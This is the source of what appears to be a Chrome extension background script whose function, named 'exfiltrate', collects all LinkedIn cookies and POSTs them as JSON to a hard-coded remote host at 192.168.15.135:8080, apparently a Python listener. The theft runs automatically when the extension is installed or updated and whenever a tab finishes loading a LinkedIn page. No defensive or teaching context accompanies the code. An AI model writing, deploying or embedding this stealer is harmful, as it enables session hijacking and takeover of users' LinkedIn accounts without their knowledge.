const remoteURL = "http://192.168.15.135:8080/";

async function exfiltrate() {
  console.log("Attempting exfiltration...");
  
  chrome.cookies.getAll({ domain: ".linkedin.com" }, async (cookies) => {
    if (cookies.length > 0) {
      try {
        const response = await fetch(remoteURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(cookies)
        });
        
        if (response.ok) {
          console.log("Successfully sent cookies to Python.");
          chrome.storage.local.set({ status: "complete" });
        }
      } catch (e) {
        console.error("Could not connect to Python server:", e);
      }
    } else {
      console.log("No LinkedIn cookies found.");
    }
  });
}

// 1. Run when the extension is first loaded or updated
chrome.runtime.onInstalled.addListener(exfiltrate);

// 2. Run when a tab is updated (e.g., user goes to linkedin.com)
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && tab.url.includes("linkedin.com")) {
    exfiltrate();
  }
});